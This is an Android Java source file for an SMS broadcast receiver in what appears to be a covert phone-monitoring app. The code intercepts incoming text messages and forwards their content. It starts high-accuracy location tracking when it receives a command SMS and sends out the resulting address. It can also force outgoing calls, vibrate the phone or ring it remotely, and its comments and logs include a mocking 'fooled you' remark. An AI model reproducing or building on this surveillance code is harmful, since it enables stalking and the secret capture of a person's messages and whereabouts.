package org.hhm.way.receiver;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Map;

import org.hhm.way.db.impl.LogImpl;
import org.hhm.way.singleton.UserInfo;
import org.hhm.way.util.Message;
import org.hhm.way.util.PreferencesService;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Vibrator;
import android.telephony.SmsMessage;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.LocationClientOption.LocationMode;

public class SMSReceiver extends BroadcastReceiver {

	private PreferencesService preferencesService;
	public LocationClient mLocationClient = null;
	public BDLocationListener myListener = new MyLocationListener();
	LogImpl logImpl = new LogImpl();

	Context context1 = null;

	@Override
	public void onReceive(Context context, Intent intent) {
		preferencesService = new PreferencesService(context);
		context1 = context;
		Bundle bundle = intent.getExtras();
		Object[] objects = (Object[]) bundle.get("pdus");
		for (Object obj : objects) {
			SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) obj);
			String body = smsMessage.getDisplayMessageBody();
			String address = smsMessage.getDisplayOriginatingAddress();
			long date = smsMessage.getTimestampMillis();

			SimpleDateFormat format = new SimpleDateFormat(
					"yyyy-MM-dd hh:mm:ss");
			String dateStr = format.format(date);

			String phoneNumber = UserInfo.getInstacne().getPhoneNumber();

			// 获取储存信息
			Map<String, String> params1 = preferencesService
					.getFunctionCheckBoxPerferences();
			Map<String, String> params2 = preferencesService
					.getLocationOrderPerferences();
			Map<String, String> params3 = preferencesService
					.getOutcomingOrderPerferences();
			Map<String, String> params4 = preferencesService
					.getPhoneNumberPerferences();
			Map<String, String> params5 = preferencesService
					.getRingOrderPerferences();
			Map<String, String> params6 = preferencesService
					.getVibrateOrderPerferences();

			String monitor_phomenumber = params4.get("PhoneNumber");

			// 首先判断是否为指定号码
			if (monitor_phomenumber.equals(phoneNumber)) {
				// 再判断用户开启了哪个功能

				// 如果用户开启了1.短信拦截功能
				if (params1.get("sms").equals("1")) {
					Message message = new Message();

					String content = address + "给监控电话:" + phoneNumber + "在"
							+ dateStr + "这个时候" + "发送了一下这个信息:" + body;
					message.sendMessage(content);

					logImpl.Insert("短信", content, context);

				}

				// 如果用户开启了2.来电功能
				if (params1.get("incoming").equals("1")) {
					// 哈哈，被骗了吧，来电要另外开一个服务

				}

				System.out.println(params1.get("location") + "_" + body + "_"
						+ params2.get("LocationOrder"));

				// 如果用户开启了3.位置功能
				if (params1.get("location").equals("1")
						&& body.equals(params2.get("LocationOrder"))) {

					mLocationClient = new LocationClient(context); // 声明LocationClient类
					mLocationClient.registerLocationListener(myListener); // 注册监听函数
					LocationClientOption option = new LocationClientOption();
					option.setLocationMode(LocationMode.Hight_Accuracy);// 设置定位模式
					option.setCoorType("bd09ll");// 返回的定位结果是百度经纬度,默认值gcj02
					option.setScanSpan(5000);// 设置发起定位请求的间隔时间为5000ms
					option.setIsNeedAddress(true);// 返回的定位结果包含地址信息
					option.setNeedDeviceDirect(true);// 返回的定位结果包含手机机头的方向
					mLocationClient.setLocOption(option);
					mLocationClient.start();
					mLocationClient.requestLocation();

				}

				// 如果用户开启了4.拨电话功能
				if (params1.get("dialog").equals("1")
						&& body.equals(params3.get("OutcomingOrder"))) {
					logImpl.Insert("位置监控", "你被强制拨打了电话", context);

					Intent phoneIntent = new Intent(
							"android.intent.action.CALL", Uri.parse("tel:"
									+ monitor_phomenumber));

					// 启动拨打
					context.startActivity(phoneIntent);

				}

				// 如果用户开启了 5，控制震动
				if (params1.get("vibrate").equals("1")
						&& body.equals(params6.get("VibrateOrder"))) {
					logImpl.Insert("位置监控", "你的手机震动了", context);

					Vibrator vibrator = (Vibrator) context
							.getSystemService(Service.VIBRATOR_SERVICE);
					vibrator.vibrate(Integer.parseInt(params6
							.get("VibrateTime")));
				}

				// 如果用户开启了 6，控制铃声
				if (params1.get("ring").equals("1")
						&& body.equals(params5.get("RingOrder"))) {
					logImpl.Insert("位置监控", "你的铃声响了", context);

					MediaPlayer mp = new MediaPlayer();
					mp.reset();

					String time = params5.get("RingTime");
					// 设置时长
					mp.seekTo(Integer.parseInt(time));
					try {
						mp.setDataSource(context, RingtoneManager
								.getDefaultUri(RingtoneManager.TYPE_RINGTONE));

						mp.prepare();

					} catch (IllegalArgumentException e) {
						e.printStackTrace();
					} catch (SecurityException e) {
						e.printStackTrace();
					} catch (IllegalStateException e) {
						e.printStackTrace();
					} catch (IOException e) {
						e.printStackTrace();
					}
					mp.start();
				}

			}

		}

	}

	class MyLocationListener/* 内部类 */implements BDLocationListener {
		@Override
		public void onReceiveLocation(BDLocation location) {
			if (location == null)
				return;
			String address = location.getAddrStr();
			double latitude = location.getLatitude();
			double longitude = location.getLongitude();
			Message message = new Message();
			try {

				message.sendMessage(address);
				logImpl.Insert("位置监控", address, context1);

				mLocationClient.stop();
			} catch (Exception e) {
				e.printStackTrace();

			}

		}
	}

}
